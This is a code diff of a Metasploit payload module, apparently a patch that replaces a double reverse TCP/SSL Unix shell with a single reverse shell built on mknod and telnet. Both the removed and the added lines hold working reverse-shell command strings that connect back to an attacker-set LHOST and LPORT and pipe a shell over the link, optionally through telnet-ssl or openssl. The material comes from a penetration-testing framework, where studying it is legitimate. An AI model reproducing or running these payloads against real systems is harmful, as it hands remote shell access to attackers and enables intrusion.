@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp_double'
+require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -21,20 +21,21 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Double reverse TCP (telnet) or Double reverse SSL (openssl)',
+			'Name'          => 'Unix Command Shell, Reverse TCP (telnet)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell through two inbound connections',
-			'Author'        => [
-						'hdm', # original module
-						'RageLtMan' # SSL patch
-					],
+			'Description'   => %q{
+				Creates an interactive shell via mknod and telnet.
+				This method works on Debian and other systems compiled
+				without /dev/tcp support. Telnet-ssl support included.
+				},
+			'Author'        => 'RageLtMan',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpDouble,
+			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
-			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'telnet',
+			'PayloadType'   => 'cmd_bash',
+			'RequiredCmd'   => 'bash-tcp',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -55,21 +56,11 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
+		pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
 		if datastore['SSL']
-			# PoC for ssl shell implementation with SslTcpServer
-			cmd = "sh -c '(openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
-				"/bin/sh 2&>1|openssl s_client -connect #{datastore['LHOST']}:" +
-				"#{datastore['LPORT']})'>/dev/null 2>&1 &"
+			cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
 		else
-			cmd =
-				"sh -c '(sleep #{3600+rand(1024)}|" +
-				"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
-				"while : ; do sh && break; done 2>&1|" +
-				"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
-				" >/dev/null 2>&1 &)'"
+			cmd = "mknod #{pipe_name} p && telnet #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
 		end
-
-		return cmd
 	end
-
 end
